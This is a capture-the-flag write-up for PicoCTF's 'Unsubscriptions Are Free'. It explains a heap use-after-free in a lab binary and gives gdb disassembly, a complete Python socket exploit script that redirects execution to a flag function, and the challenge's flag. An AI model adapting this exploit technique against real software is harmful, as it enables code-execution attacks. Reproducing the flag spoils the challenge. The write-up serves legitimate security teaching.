# CTF Writeup: PicoCTF - Unsubscriptions Are Free

## Challenge Description

Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 58574

## Solution

### Introduction

The challenge provides us with a binary named vuln. After running the program, we are prompted with a CLI menu. The goal is to call a specific function to obtain the flag.

```
$ ./vuln
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit

```

### Functions

#### (S)ubscribe to my channel

Next, we observe that when we perform the `(S)ubscribe to my channel` option, the `hahaexploitgobrrr` function is revealed. However, we must find a way to call it.

```
S
OOP! Memory leak...0x80487d6
Thanks for subsribing! I really recommend becoming a premium member!
...
```

#### hahaexploitgobrrr

The flag will be revealed by the hahaexploitgobrrr function.
```
$ gdb vuln
(gdb) set disassembly-flavor intel
(gdb) disassemble 0x80487d6
Dump of assembler code for function hahaexploitgobrrr:
   ...
   0x080487ff <+41>:	push   eax
   0x08048800 <+42>:	lea    eax,[ebx-0x21be]		# "flag.txt"
   0x08048806 <+48>:	push   eax
   0x08048807 <+49>:	call   0x8048670 <fopen@plt>
   0x0804880c <+54>:	add    esp,0x10
   0x0804880f <+57>:	mov    DWORD PTR [ebp-0xd8],eax
   0x08048815 <+63>:	sub    esp,0x4
   0x08048818 <+66>:	push   DWORD PTR [ebp-0xd8]
   0x0804881e <+72>:	push   0xc8
   0x08048823 <+77>:	lea    eax,[ebp-0xd4]
   0x08048829 <+83>:	push   eax
   ...
End of assembler dump

```

#### (I)nquire about account deletion

This function will free the user object contains the addresses of functions to be called.

#### (M)ake an Twixer account

This function will allocate memory for the user object.

#### (l)eave a message(with or without logging in)

This function can add a message to the heap, and if the user object was previously freed, it can cause a use-after-free vulnerability by overwriting the user object and redirecting code execution.


### Exploit

Now that we successfully were able to redirect code execution, let's create an exploit script to get the flag.

To exploit the program:

1. Subscribe to the channel to obtain the hahaexploitgobrrr function address.
2. Register to create a user object.
3. Request account deletion to free the user object.
4. Leave a message to overwrite the user object in the heap with hahaexploitgobrrr. (This causes use-after-free)
5. Retrieve the flag.

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("mercury.picoctf.net", 58574))

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'M')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'asdf\n')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'S')

s.recv(19).decode()

addr = s.recv(19)[2:-1]

hahaexploitgobrrr = struct.pack("I", int(addr, 16))

s.recv(1024).decode()

s.send(b'I')

s.recv(1024).decode()

s.send(b'Y')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(b'L')

s.recv(1024).decode()
s.recv(1024).decode()

s.send(hahaexploitgobrrr)

print(s.recv(1024).decode())
s.recv(1024).decode()

```

```
john@john:~/CTF/picoctf/unsubscriptions_are_free$ python3 exploit.py 
picoCTF{d0ubl3_j30p4rdy_ec42c6fc}
```
